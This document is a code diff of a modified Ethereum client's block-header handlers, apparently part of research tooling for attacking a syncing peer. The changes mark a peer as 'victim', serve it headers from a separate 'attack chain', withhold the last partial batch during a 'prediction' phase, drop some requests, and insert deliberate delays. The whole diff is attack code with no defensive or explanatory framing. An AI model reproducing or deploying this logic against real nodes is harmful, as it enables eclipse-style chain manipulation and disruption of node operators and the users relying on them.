@@ -58,15 +58,21 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 		attackChain.SetHc(headerchain)
 	}
 
+	q := query.GetBlockHeadersPacket
+	bq := &bridge.GetBlockHeadersPacket{
+		Origin: bridge.HashOrNumber{Hash: q.Origin.Hash, Number: q.Origin.Number},
+		Amount: q.Amount,
+		Skip: q.Skip,
+		Reverse: q.Reverse,
+	}
 	chain := backend.Chain()
-	if bridge.MustUseAttackChain() {
+	if bridge.MustUseAttackChain(bq) {
 		chain = attackChain
 		log.Info("Using attack chain to fulfil it")
 	} else {
 		log.Info("Using honest chain to fulfil it")
 	}
 
-	q := query.GetBlockHeadersPacket
 	/*
 	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false &&
 	   bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
@@ -78,12 +84,13 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 	}
 	*/
 
-	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
-	   	if bridge.LastPartialBatch(q.Origin.Number) && bridge.DoingPrediction() {
+	if q.Amount == 192 && q.Skip == 0 && q.Reverse == false &&
+	 bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.DoingPrediction() {
+	   	if bridge.LastPartialBatch(q.Origin.Number) {
 	   		return nil						// We won't serve last 88 headers during prediction
 	   	}
 
-	   	if !bridge.BatchExists(q.Origin.Number) {
+	   	if !bridge.PredictionBatchExists(q.Origin.Number) {
 	   		return nil						// If we get a query for a batch we don't have, we just drop it.
 	   										// Very soon the syncOp will be stopped and a new one started anyway.
 	   	}
@@ -110,16 +117,21 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	first := true
 	maxNonCanonical := uint64(100)
 
-	if hashMode && query.Origin.Hash == bridge.Latest().Hash() && query.Amount == 2 && query.Skip == 63 && query.Reverse {
+	if hashMode /*&& query.Origin.Hash == bridge.Latest().Hash()*/ && query.Amount == 2 && query.Skip == 63 && query.Reverse {
 		//bridge.SetMasterPeer()
 		bridge.SetVictimIfNone(peer.Peer)
 		if bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 			bridge.SetMasterPeer()
 		}
 
-		//head, pivot := bridge.GetHigherHeadAndPivot()
+		bq := &bridge.GetBlockHeadersPacket{
+			Origin: bridge.HashOrNumber{Hash: query.Origin.Hash, Number: query.Origin.Number},
+			Amount: query.Amount,
+			Skip: query.Skip,
+			Reverse: query.Reverse,
+		}
 
-		if chain != attackChain && bridge.MustUseAttackChain() {
+		if chain != attackChain && bridge.MustUseAttackChain(bq) {
 			chain = attackChain 			// As we changed the bridge state (setting a victim), re-check whether
 											// we need to use attack chain
 			log.Info("Switched to attack chain because victim is now set")
@@ -142,6 +154,12 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 		if bridge.DoingPrediction() {
 			bridge.WaitBeforePivoting()
 		}
+	}
+
+	//skeleton := false
+	if !hashMode && query.Amount == 128 && query.Skip == 192 {
+		bridge.SetSkeletonStart(query.Origin.Number)
+		//skeleton = true
 	}
 
 
@@ -173,9 +191,14 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 		} else {
 			origin = chain.GetHeaderByNumber(query.Origin.Number)
 		}
-		if origin == nil {
+		if origin == nil{
 			break
 		}
+
+		if bridge.StopMoving() && query.Origin.Number > bridge.FixedHead() {
+			break
+		}
+
 		if rlpData, err := rlp.EncodeToBytes(origin); err != nil {
 			log.Crit("Unable to decode our own headers", "err", err)
 		} else {
@@ -265,6 +288,11 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 				bridge.WaitBeforeLastFullBatch()
 			}
 			bridge.ServedBatchRequest(query.Origin.Number, peer.Peer.ID().String()[:8])
+		}
+
+		if len(headers) < 192 && !query.Reverse && bridge.DoingSync() {
+			log.Info("Delaying last partial batch")
+			bridge.DelayBeforeServingBatch()
 		}
 
 		return headers
